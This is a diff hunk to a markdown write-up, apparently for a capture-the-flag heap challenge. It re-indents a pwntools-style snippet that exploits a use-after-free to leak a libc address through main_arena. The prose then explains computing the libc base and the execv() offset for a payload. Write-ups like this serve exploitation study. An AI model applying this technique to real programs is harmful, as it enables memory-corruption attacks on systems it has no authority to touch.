@@ -63,14 +63,14 @@
 
 2. To leak something of libc, we need to apply the memory from the **main_arena**, which means we need to create two long name objects and free the first chunck then use it.
 
-```
-#Secend UAF, leak the libc
-buy(256, "AAAABBBB") #Index 0
-buy(256, "CCCCDDDD") #Index 1
-select(0)
-drop(0)
-libcleak = u32(use())
-```	
+	```
+	#Secend UAF, leak the libc
+	buy(256, "AAAABBBB") #Index 0
+	buy(256, "CCCCDDDD") #Index 1
+	select(0)
+	drop(0)
+	libcleak = u32(use())
+	```	
 **Q: Why we need to create the second chunck? (unsortbin struct)**
 
 3. Then, we need to do some math to calculate the base address of libc then plus the offset of `execv()` to make our payload. Because the function address in libc is fixed, we can directly print the base address of libc locally and calculate the offset between the address we leak and the base address of libc.
